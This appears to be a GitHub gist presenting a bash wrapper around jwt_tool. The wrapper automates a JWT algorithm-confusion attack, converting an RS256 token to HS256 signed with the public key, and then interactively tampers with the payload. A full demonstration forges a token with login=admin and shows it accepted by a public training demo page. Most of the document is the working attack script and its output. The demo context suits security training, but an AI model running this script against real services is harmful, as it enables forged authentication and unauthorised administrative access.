# JWT_Tool: eXploits key confusion and Tamper

##
## https://gist.github.com/FrancoisCapon/7e766d06cf9372fb8b5436a37b8bf18d
##

- [Web Security Academy >> JWT attacks >> Algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format)
- [JWT_Tool](https://github.com/ticarpi/jwt_tool): JWT_Tool: eXploits key confusion (RS -> HS) and interactively Tampers with the payload.

```
jwt_tool-Xk-T.sh 
$1: the jwt_tool command (ex: "python3 jwt_tool/jwt_tool.py")
$2: the RS JWT
$3: the public key file
```
## Demonstration of usage

- [Sjoerd Langkemper > Attacking JWT authentication > Changing the algorithm from RS256 to HS256](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/#changing-the-algorithm-from-rs256-to-hs256)
- [RES256 demo page](http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php) and the [public key](http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem)

### :one: Change the algorithm
```
$ ./jwt_tool-Xk-T.sh "python3 ./jwt_tool/jwt_tool.py" `cat jwt_rs-demo` public-demo.pem

=================================================================================
JWT_Tool: eXploits key confusion (RS -> HS) then Tamper interactively the payload
=================================================================================

- $1: the jwt_tool command (ex: "python3 jwt_tool/jwt_tool.py")
- $2: the RS JWT
- $3: the public key file

- https://github.com/ticarpi/jwt_tool

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi      

Original JWT: 

Token: {"typ":"JWT","alg":"RS256"}.{"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1662386816,"exp":1662388016,"data":{"hello":"world"}}.T_1-6eFmmAJMzY0_pPq2F-yc_CUUJ1N73noqNGTNYV3rz54R04vuyA2_3yXjU_6oGoiOkvo7VkPeSGn8RESfAPJ6PwDg0wjqLaC7QHe_OXasKO6MP1XH_UJPJOmkkBgGPiEklUC1X_RWnICpnfY1VvO7I4Y0L584vodXW-FMAapM3q6JXMjKZd97n-mz7vALgB3UolhJKIT9xQwOoPFXh8PhqXCTio5akN_RmZ_wgtNkQEYweXaXULr1yJtryjRZf64nT8zIOhKSsvzfzjklDkb9rXfpv67x7w3mOqMFSsBdkJURfJjGxvhfNlnvtH1SFXb2IF1arfzS3Fjx2jrmlw

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"

Token payload values:
[+] iss = "http://demo.sjoerdlangkemper.nl/"
[+] iat = 1662386816    ==> TIMESTAMP = 2022-09-05 16:06:56 (UTC)
[+] exp = 1662388016    ==> TIMESTAMP = 2022-09-05 16:26:56 (UTC)
[+] data = JSON object:
    [+] hello = "world"

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 0 hours, 20 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi      

Original JWT: 

Token: {"typ":"JWT","alg":"HS256"}.{"iss":"http://demo.sjoerdlangkemper.nl/","iat":1662386816,"exp":1662388016,"data":{"hello":"world"}}.Byv0a8OTgwEdQ0P9kmQ826R5dQccTtec5LB4NVd7rB4

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] iss = "http://demo.sjoerdlangkemper.nl/"
[+] iat = 1662386816    ==> TIMESTAMP = 2022-09-05 16:06:56 (UTC)
[+] exp = 1662388016    ==> TIMESTAMP = 2022-09-05 16:26:56 (UTC)
[+] data = JSON object:
    [+] hello = "world"

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 0 hours, 20 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```
### :two: Modify the payload
```
        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi      

Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 
Token payload values:
[1] iss = "http://demo.sjoerdlangkemper.nl/"
[2] iat = 1662386816    ==> TIMESTAMP = 2022-09-05 16:06:56 (UTC)
[3] exp = 1662388016    ==> TIMESTAMP = 2022-09-05 16:26:56 (UTC)
[4] data = JSON object:
    [+] hello = "world"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5
Please enter new Key and hit ENTER
> login
Please enter new value for login and hit ENTER
> admin
[1] iss = "http://demo.sjoerdlangkemper.nl/"
[2] iat = 1662386816    ==> TIMESTAMP = 2022-09-05 16:06:56 (UTC)
[3] exp = 1662388016    ==> TIMESTAMP = 2022-09-05 16:26:56 (UTC)
[4] data = JSON object:
    [+] hello = "world"
[5] login = "admin"
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_26853e226891d4fd80613a709507c0bd - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTY2MjM4NjgxNiwiZXhwIjoxNjYyMzg4MDE2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifSwibG9naW4iOiJhZG1pbiJ9.SrJY8M9Vn6W7uKgVCFgJWMOsnbgpe_D2lEn2RRkDegw
```
### :three: Use the new tampered JWT
```
http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php > Send JWT

Valid JWT: stdClass Object
(
    [iss] => http://demo.sjoerdlangkemper.nl/
    [iat] => 1662386816
    [exp] => 1662388016
    [data] => stdClass Object
        (
            [hello] => world
        )

    [login] => admin ;-)
)
```
### :four: Happy ethical hack :skull: 


```
##
## https://gist.githubusercontent.com/FrancoisCapon/7e766d06cf9372fb8b5436a37b8bf18d/raw/c40177a0b2bd510390b0fe6337a866b98974b7b2/B-jwt_tool-Xk-T.sh
##

clear
echo
echo '================================================================================='
echo 'JWT_Tool: eXploits key confusion (RS -> HS) then Tamper interactively the payload'
echo '================================================================================='
echo
echo '- $1: the jwt_tool command (ex: "python3 jwt_tool/jwt_tool.py")'
echo '- $2: the RS JWT'
echo '- $3: the public key file'
echo
echo '- https://github.com/ticarpi/jwt_tool'

if [ "$#" -ne 3 ]; then
    echo
    exit 1
fi

jwt_tool_command=$1
jwt_rs=$2
public_pem_file=$3

$jwt_tool_command --verbose "$jwt_rs"
jwt_rs_header=`$jwt_tool_command --verbose $jwt_rs | grep 'Token:' | cut -d '.' -f 1 | cut -d ' ' -f2` # $($...) KO
jwt_algorithm_size=$(echo $jwt_rs_header | grep -o [[:digit:]] | tr -d '\n')

# Change the algorithm $jwt_rs -> $jwt_hs
jwt_hs=`$jwt_tool_command $jwt_rs --exploit k --pubkey $public_pem_file --bare` # -b, --bare return TOKENS ONLY
$jwt_tool_command --verbose "$jwt_hs"

# Modify the payload of $jwt_hs
# https://stackoverflow.com/questions/5843741/how-can-i-pipe-initial-input-into-process-which-will-then-be-interactive
$jwt_tool_command $jwt_hs --sign hs$jwt_algorithm_size --keyfile $public_pem_file --tamper  < <(echo '0' && cat)
```
